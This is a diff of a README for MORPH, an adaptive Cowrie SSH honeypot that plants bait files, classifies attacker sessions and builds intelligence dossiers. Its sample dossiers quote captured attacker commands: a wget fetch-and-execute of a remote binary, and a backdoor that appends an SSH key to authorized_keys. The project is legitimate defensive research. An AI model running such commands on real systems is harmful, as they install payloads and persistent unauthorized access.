@@ -1,259 +1,299 @@
 # MORPH — Modular Reactive Polymorphic Honeypot
 
-An adaptive deception layer for Cowrie SSH honeypots that increases attacker dwell time and generates intelligence dossiers.
+An adaptive SSH honeypot system built on Cowrie that increases attacker dwell time, classifies behavior in real-time, and generates structured intelligence dossiers.
+
+> **Live deployment:** Actively capturing real-world attack data on a public VPS since March 2026.
+
+---
 
 ## What It Does
 
-Traditional honeypots are static. Attackers learn their fingerprints and bail quickly. MORPH solves this by:
+Traditional honeypots are static and easily fingerprinted. Attackers recognize them and leave quickly. MORPH solves this by making the environment react and evolve:
 
-1. **Watching attackers in real-time** — parsing Cowrie logs as they're written
-2. **Planting bait mid-session** — creating fake files (credentials, backups, scripts) based on what commands the attacker runs
-3. **Learning across sessions** — adapting the fake environment based on patterns from previous attackers
-4. **Generating dossiers** — structured JSON intelligence files for each attacker session
+1. **Watches attackers in real-time** — tails Cowrie logs as they're written
+2. **Plants bait mid-session** — creates fake credentials, backups, and scripts based on what commands the attacker runs
+3. **Learns across sessions** — adapts the fake environment based on patterns from previous attackers
+4. **Generates intelligence dossiers** — structured JSON per session with classification, commands, and OSINT enrichment
+5. **Builds attacker profiles** — aggregates session history per IP with threat scoring
 
-Result: attackers stay longer, reveal more TTPs, and each one sees a slightly different environment.
+---
 
-## How It Works
+## Architecture
 
 ```
-┌──────────────────────────────────────────────────────────────────────────────┐
-│                              MORPH Architecture                               │
-└──────────────────────────────────────────────────────────────────────────────┘
-
-  Attacker ──► Cowrie SSH ──► cowrie.json
-                                   │
-                                   ▼
-                           ┌──────────────┐
-                           │  Log Parser  │  (log_parser.py)
-                           │  - Sessions  │
-                           │  - Commands  │
-                           │  - Downloads │
-                           └──────┬───────┘
-                                  │
-                                  ▼
-                           ┌──────────────┐
-                           │  Classifier  │  (classifier.py)
-                           │  - Bot/Human │
-                           │  - Intent    │
-                           │  - Risk      │
-                           └──────┬───────┘
-                                  │
-                    ┌─────────────┼─────────────┐
-                    ▼             ▼             ▼
-             ┌───────────┐ ┌───────────┐ ┌───────────┐
-             │  Dossier  │ │  Adaptor  │ │  Reactor  │
-             │ Generator │ │  (cross-  │ │ (real-    │
-             │           │ │  session) │ │  time)    │
-             └─────┬─────┘ └─────┬─────┘ └─────┬─────┘
-                   │             │             │
-                   │             ▼             ▼
-                   │       ┌─────────────────────────┐
-                   │       │   Cowrie honeyfs/       │
-                   │       │   (fake filesystem)     │
-                   │       └─────────────────────────┘
-                   │
-                   ▼
-            ┌─────────────┐
-            │  Flask UI   │
-            │  + HTMX     │
-            └─────────────┘
+Attacker ──► Cowrie SSH (port 22) ──► cowrie.json
+                                           │
+                          ┌────────────────┼────────────────┐
+                          ▼                ▼                ▼
+                    Log Parser        Reactor.py        Adaptor.py
+                    (sessions,        (real-time        (cross-session
+                     commands,         honeyfs           environment
+                     logins)           mutation)         evolution)
+                          │                │                │
+                          ▼                └────────┬───────┘
+                    Classifier                      ▼
+                    (bot/human,             Cowrie honeyfs/
+                     intent, risk)          (fake filesystem)
+                          │
+                          ▼
+                    Dossier Generator
+                    (JSON per session)
+                          │
+                          ▼
+                    OSINT Enrichment
+                    (ipinfo.io)
+                          │
+                          ▼
+                    Flask Dashboard
+                    (sessions, intelligence,
+                     live logs, IP profiles)
 ```
+
+---
 
 ## Key Features
 
-### Adaptive Deception (3 Levels)
+### Adaptive Deception — 3 Levels
 
-| Level | Module | Description |
+| Level | Module | What It Does |
 |-------|--------|-------------|
-| Static | `deception.py` | Pre-planted fake assets (SQL dumps, API keys, .env files) |
-| Reactive | `reactor.py` | Real-time file creation based on attacker commands |
-| Adaptive | `adaptor.py` | Cross-session learning — environment evolves based on attack history |
+| Static | `deception.py` | Pre-planted fake assets: SQL dumps, API keys, `.env` files, nginx configs |
+| Reactive | `reactor.py` | Files appear mid-session based on attacker commands |
+| Adaptive | `adaptor.py` | Environment evolves based on previous attack history |
+
+**Reactive triggers:**
+
+| Attacker Command | MORPH Response |
+|-----------------|----------------|
+| `ls /var/www` | Plants `config.php` with fake DB credentials |
+| `cat /etc/passwd` | Creates `.ssh/authorized_keys` with fake keys |
+| `wget` / `curl` | Drops fake malware script in `/tmp/` |
+| `find` / `locate` | Creates `db_backup_2024.sql.gz` in `/opt/backup/` |
+| `ps aux` | Creates `.monitor` persistence artifact in `/tmp/` |
+
+**Cross-session adaptation:**
+- Backup targeted repeatedly → relocated to randomized path
+- Shadow file targeted → replaced with crackable md5crypt hashes
+- Bots detected → inflated `/etc/services` to waste scanner time
+- Human exploit seen → fake WIP exploit planted in `/tmp/work/`
 
 ### Rule-Based Classifier
 
-Classifies each session without ML:
+No ML. Pure logic. Classifies every session:
 
-- **Type**: `bot` or `human` (based on timing, command patterns, repetition)
-- **Intent**: `recon`, `exploit`, or `persistence`
-- **Risk**: `low`, `medium`, or `high`
-- Returns `matched_rules` list for transparency
+- **Type**: `bot` or `human`
+- **Intent**: `recon` / `exploit` / `persistence`
+- **Risk**: `low` / `medium` / `high`
+- **matched_rules**: full audit trail of what triggered the classification
 
-### Real-Time Reaction Engine
+Bot detection rules: sub-second sessions, rapid commands (>1.5/sec), scanner sequences, credential stuffing, short probe sessions with no commands.
 
-Monitors `cowrie.json` live. Triggers include:
+### IP Intelligence
 
-| Attacker Action | Reactor Response |
-|-----------------|------------------|
-| `ls /var/www` | Plants `config.php` with fake DB creds |
-| `cat /etc/passwd` | Creates `.ssh/authorized_keys` + `.bash_history` |
-| `wget`/`curl` | Drops fake malware script in `/tmp/` |
-| `find`/`locate` | Creates `db_backup_2024.sql.gz` in `/opt/backup/` |
+Per-IP attacker profiles built from session history:
+- Session count, first/last seen, type and intent breakdown
+- Threat score: `(high_risk × 3) + (medium_risk × 1) + (persistence × 2)`
+- OSINT enrichment: country, org/ASN, city, timezone via ipinfo.io
+- Full command history across all sessions from that IP
 
-Files are written to honeyfs/. Cowrie's fs.py is patched to auto-register new files on each connection — no pickle editing or reload required.
+### Flask Dashboard
 
-### Cross-Session Memory
+- **Dashboard** — live stats, top attacker IPs, recent activity, intent distribution
+- **Sessions** — server-side filtered and paginated, multi-select filters
+- **Intelligence** — IP profiles with threat scores and OSINT data
+- **Live Logs** — real-time Cowrie event stream, color-coded by event type
+- **About** — project description and live stats
 
-`adaptor.py` learns from previous sessions:
+Dark theme, HTMX polling, no JS frameworks. Deployed behind nginx with basic auth.
 
-- If backups were targeted → relocate to randomized paths
-- If 2+ attackers tried `/etc/shadow` → plant crackable md5crypt hashes
-- If bots detected → add fake open ports to `/etc/services`
-- If human+exploit seen → drop half-written exploit in `/tmp/work/`
-
-### Attacker Dossiers
-
-JSON intelligence files per session:
-
-- Full command history
-- Login attempts
-- Downloads
-- Classification + matched rules
-- Environment adaptations applied
-
-### Flask + HTMX Dashboard
-
-- Session list with risk badges
-- Dossier detail view
-- Live log tail (auto-refresh every 3s)
-- Dark theme, no JS frameworks
+---
 
 ## Tech Stack
 
-- **Python 3.10+** — core pipeline
-- **Flask** — web UI
-- **HTMX** — live updates without JS frameworks
+- **Python 3.10** — core pipeline
+- **Flask + HTMX** — web UI, live updates
 - **Cowrie** — SSH honeypot backend
-- **watchdog** — filesystem monitoring for reactor
+- **ipinfo.io** — free tier OSINT enrichment
+- **nginx** — reverse proxy with basic auth
+- **systemd** — service management for Cowrie, reactor, and Flask
+
+---
 
 ## Project Structure
 
 ```
 MORPH/
-├── main.py            # Pipeline orchestrator
-├── log_parser.py      # Cowrie JSON log parser
-├── classifier.py      # Rule-based session classifier
-├── dossier.py         # JSON dossier generator
-├── deception.py       # Static fake asset creator
-├── adaptor.py         # Cross-session learning engine
-├── reactor.py         # Real-time reaction engine
-├── app.py             # Flask web UI
-├── fs.py              # Cowrie patch: auto-registers new honeyfs files
+├── main.py                 # Pipeline orchestrator
+├── pipeline.py             # Cron-safe pipeline (no Flask)
+├── log_parser.py           # Cowrie JSON log parser
+├── classifier.py           # Rule-based session classifier
+├── dossier.py              # JSON dossier generator
+├── deception.py            # Static fake asset creator
+├── adaptor.py              # Cross-session learning engine
+├── reactor.py              # Real-time honeyfs reaction engine
+├── osint.py                # IP enrichment via ipinfo.io
+├── ip_profiles.py          # Per-IP attacker profile builder
+├── cleanup.py              # Dossier count management
+├── app.py                  # Flask web UI + caching layer
+├── fs.py                   # Cowrie patch: auto-registers honeyfs files
+├── setup_honeyfs.py        # Populates fake filesystem content
+├── populate_honeyfs.py     # Additional honeyfs bait files
+├── update_cmdoutput.py     # Adds realistic ps aux output
+├── morph-flask.service     # systemd service for Flask
+├── install_flask_service.sh
+├── cowrie-logrotate.conf   # Log rotation config
 ├── templates/
-│   ├── base.html      # Layout with nav
-│   ├── index.html     # Dashboard
-│   ├── sessions.html  # Session list
-│   ├── dossier.html   # Session detail
-│   ├── live_logs.html # Auto-refresh log view
-│   └── _log_fragment.html
-├── morph/
-│   ├── dossiers/      # Generated JSON dossiers
-│   ├── deception.log
-│   ├── adaptor.log
-│   └── reactor.log
-└── .gitignore
+│   ├── base.html
+│   ├── index.html          # Dashboard
+│   ├── sessions.html       # Session list with filters
+│   ├── dossier.html        # Session detail
+│   ├── intelligence.html   # IP profiles list
+│   ├── ip_detail.html      # Per-IP detail view
+│   ├── live_logs.html      # Real-time event stream
+│   ├── about.html          # Project info
+│   └── _log_fragment.html  # HTMX partial
+└── morph/
+    ├── dossiers/           # Generated JSON dossiers (gitignored)
+    ├── ip_profiles.json    # Cached IP profiles (gitignored)
+    └── *.log               # Runtime logs (gitignored)
 ```
 
-## Setup
+---
 
-### 1. Cowrie (Linux/VPS)
+## Deployment Setup
+
+### VPS Requirements
+- Ubuntu 22.04, 1GB RAM minimum
+- Ports: 22 (Cowrie via iptables), 80 (nginx), 443 (real SSH)
+
+### Cowrie
 
 ```bash
-# Standard Cowrie installation
-git clone https://github.com/cowrie/cowrie.git /home/cowrie/cowrie
-cd /home/cowrie/cowrie
-python3 -m venv cowrie-env
+git clone https://github.com/cowrie/cowrie.git ~/cowrie
+cd ~/cowrie
+virtualenv cowrie-env
 source cowrie-env/bin/activate
 pip install -r requirements.txt
+pip install -e .
+cp etc/cowrie.cfg.dist etc/cowrie.cfg
+# Edit etc/cowrie.cfg: set hostname = web-prod-01
 twistd --umask=0022 --pidfile=twistd.pid -n cowrie &
 ```
 
-### 2. MORPH Pipeline
+Redirect port 22 to Cowrie:
+```bash
+iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
+netfilter-persistent save
+```
+
+### MORPH
 
 ```bash
-git clone https://github.com/youruser/MORPH.git
-cd MORPH
-pip install flask watchdog
+git clone https://github.com/nisbh/MORPH.git ~/morph
+cd ~/morph
+pip install flask watchdog requests
 
-# Update paths in:
-# - log_parser.py: COWRIE_LOG
-# - adaptor.py: HONEYFS_ROOT
-# - reactor.py: all hardcoded paths
+# Apply Cowrie fs.py patch
+cp fs.py ~/cowrie/src/cowrie/shell/fs.py
 
-# Run reactor (background)
-python3 reactor.py &
+# Populate fake filesystem
+python3 setup_honeyfs.py
+python3 update_cmdoutput.py
 
-# Run pipeline + Flask UI
-python3 main.py
+# Install Flask as systemd service
+sudo bash install_flask_service.sh
+
+# Install log rotation
+sudo cp cowrie-logrotate.conf /etc/logrotate.d/cowrie
+
+# Set up cron pipeline (every 5 minutes)
+crontab -e
+# Add: */5 * * * * cd ~/morph && /path/to/python3 pipeline.py >> morph/pipeline.log 2>&1
+```
+
+### nginx (public dashboard access)
+
+```bash
+sudo apt install -y nginx apache2-utils
+sudo htpasswd -c /etc/nginx/.htpasswd morph
+# Create proxy config pointing to localhost:5000
+sudo systemctl enable --now nginx
+```
+
+---
 
 ## Sample Dossier
 
 ```json
 {
-  "session_id": "a3f8c2e1b7d9",
-  "src_ip": "185.220.101.42",
-  "start_time": "2024-03-29T14:23:17Z",
-  "end_time": "2024-03-29T14:31:45Z",
-  "duration_seconds": 508,
+  "session_id": "acd0536692b9",
+  "src_ip": "130.12.180.51",
+  "start_time": "2026-03-31T06:58:43Z",
+  "end_time": "2026-03-31T06:59:19Z",
+  "duration_seconds": 35.8,
   "login_attempts": [
-    {"username": "root", "password": "admin123", "success": false},
-    {"username": "root", "password": "toor", "success": false},
-    {"username": "admin", "password": "admin", "success": true}
+    {"username": "root", "password": "P", "success": true}
   ],
   "commands": [
-    "whoami",
-    "uname -a",
-    "cat /etc/passwd",
-    "wget http://45.33.32.156/x86",
-    "chmod +x x86",
-    "./x86"
-  ],
-  "downloads": [
-    "http://45.33.32.156/x86"
+    "chmod +x clean.sh; sh clean.sh; rm -rf clean.sh",
+    "mkdir -p ~/.ssh; echo \"ssh-rsa AAAA...\" >> ~/.ssh/authorized_keys",
+    "chmod -R go= ~/.ssh"
   ],
   "classification": {
-    "type": "bot",
-    "intent": "exploit",
+    "type": "human",
+    "intent": "persistence",
     "risk": "high",
     "matched_rules": [
-      "rapid_commands",
-      "wget_download",
-      "chmod_execute",
-      "payload_execution"
+      "recon_commands:uname,env,ss",
+      "exploit_commands:chmod +x",
+      "persistence_commands:authorized_keys,.ssh/",
+      "execution_attempts",
+      "persistence_risk"
     ]
   },
-  "environment_adaptations": {
-    "actions": [
-      "Relocated backup to /opt/.cache/data/",
-      "Added fake services to /etc/services"
-    ],
-    "triggered_by": ["previous_high_risk", "bot_detected"]
+  "osint": {
+    "city": "Aachen",
+    "region": "North Rhine-Westphalia",
+    "country": "DE",
+    "org": "AS202412 Omegatech LTD",
+    "timezone": "Europe/Berlin"
   },
-  "generated_at": "2024-03-29T14:32:01Z"
+  "generated_at": "2026-03-31T08:20:02Z"
 }
 ```
 
-## Deployment
+---
 
-Recommended: single VPS running both Cowrie and MORPH.
+## Notable Captures
 
-```bash
-# Cowrie on port 2222, iptables redirects 22→2222
-iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222
+Since deployment (March 2026):
+- **19,700+ sessions** captured from **460+ unique IPs**
+- **17,400+ bot sessions** — automated credential scanners
+- **530+ persistence attempts** — attackers trying to establish backdoors
+- **Top source:** Alibaba Cloud infrastructure (Malaysia) — 14,857 sessions
+- **Most interesting:** Human attacker from Germany (Omegatech LTD) planted SSH backdoor key using hex-encoded command to evade logging
 
-# MORPH Flask on localhost:5000 (reverse proxy via nginx if needed)
-# reactor_wsl.py runs as systemd service
-```
+---
 
 ## Constraints
 
-- **Solo dev** — single maintainer
-- **No ML** — all classification is rule-based
-- **No paid APIs** — OSINT enrichment uses free tier only
-- **Cowrie-specific** — designed for Cowrie, not generic honeypots
+- Solo dev, single maintainer
+- No ML — all classification is rule-based
+- No paid APIs — OSINT via ipinfo.io free tier
+- Cowrie-specific — not a generic honeypot framework
 
+---
+
+## Future Work
+
+- [ ] AbuseIPDB integration for IP reputation scoring
+- [ ] Telegram/Discord webhook alerts for high-risk sessions
+- [ ] Behavior fingerprinting across sessions
+- [ ] Attack prediction from early command patterns
+- [ ] Lightweight embeddings for command similarity clustering
+
+---
 
 ## License
 
 MIT
-
----
